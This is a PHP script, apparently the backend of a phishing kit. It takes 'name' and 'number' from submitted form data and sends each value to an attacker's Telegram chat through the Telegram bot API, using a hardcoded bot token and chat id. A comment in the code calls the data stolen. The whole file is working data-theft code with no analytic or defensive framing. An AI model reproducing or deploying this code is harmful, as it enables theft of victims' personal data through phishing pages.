<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 $name = $_POST['name'];
 $number = $_POST['number'];
 
 // Send the stolen data to your Telegram bot
 $telegram_token = "7082984249:AAGKgTi78QguLiYuPo7ijOb6VXaa4gfSri8";
 $chat_id = "-1002189995540";
 $message = "Name: $name ";
 $message1 = "Number: $number";
 $message0 = "{";
 $message2 = "}";
 
 $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message";
 $url1 = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message1";
 $url0 = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message0";
 $url2 = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message2";
 
 $response = file_get_contents($url0); 
 $response = file_get_contents($url);
 $response = file_get_contents($url1);
 $response = file_get_contents($url2);
 // You can add further processing or logging here
 //https://api.telegram.org/bot7082984249:AAGKgTi78QguLiYuPo7ijOb6VXaa4gfSri8/sendMessage?chat_id=-1002189995540&text=gdsgarga
}
?>

